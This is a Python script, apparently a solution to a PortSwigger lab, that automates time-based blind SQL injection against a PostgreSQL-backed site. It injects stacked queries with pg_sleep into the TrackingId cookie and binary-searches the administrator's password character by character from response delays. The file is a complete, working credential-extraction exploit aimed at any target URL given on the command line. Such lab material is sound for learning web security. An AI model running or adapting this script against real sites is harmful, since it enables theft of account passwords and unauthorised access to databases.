#!/usr/bin/env python3

# Lab: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
# PostgreSQL

import sys
import requests

def get_next_symbol(gt,lt):
	n = int((gt+lt)/2)
	if n < 32 or n > 126:
		print('Next symbol not in printable ascii range (gt={gt},lt={lt})')
		sys.exit(1)
	return chr(n)

def check_payload(s, t, p):
		# make sure the domain matches (print s.cookies if you're unsure)
		s.cookies.set(name = "TrackingId", value = p, domain = t.split('://')[1], path='/')
		r = s.get(t)
		return r.elapsed.total_seconds()>2

def main(target):
	s = requests.Session()
	# Requesting cookies
	s.get(target)
	c = s.cookies.get("TrackingId")

	gt=31
	lt=127
	next_char = get_next_symbol(gt,lt)
	pw = ''

	print(f'>>> Starting Blind SQL Injection')
	while True:
		print(f'>>> {pw}{next_char}', end='\r')
		payload = f"'%3bSELECT CASE WHEN((SELECT SUBSTR(password,1,{len(pw)+1}) FROM users WHERE username='administrator')>'{pw}{next_char}') THEN pg_sleep(2) ELSE pg_sleep(0) END--"
		if check_payload(s, target, payload):
			gt = ord(next_char)
		elif ord(next_char) == 32:
			payload = f"'%3bSELECT CASE WHEN((SELECT SUBSTR(password,1,{len(pw)+1}) FROM users WHERE username='administrator')='{pw}{next_char}') THEN pg_sleep(2) ELSE pg_sleep(0) END--"
			if not check_payload(s, target, c+payload):
				break
		else:
			lt = ord(next_char)+1

		if lt == gt + 2:
			pw += chr(gt+1)
			gt = 31
			lt = 127
		next_char = get_next_symbol(gt,lt)

	print(f'')
	print(f'Done: {pw}')

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print(f'Usage: {sys.argv[0]} <https://target-url>')
		sys.exit(1)
	main(sys.argv[1])
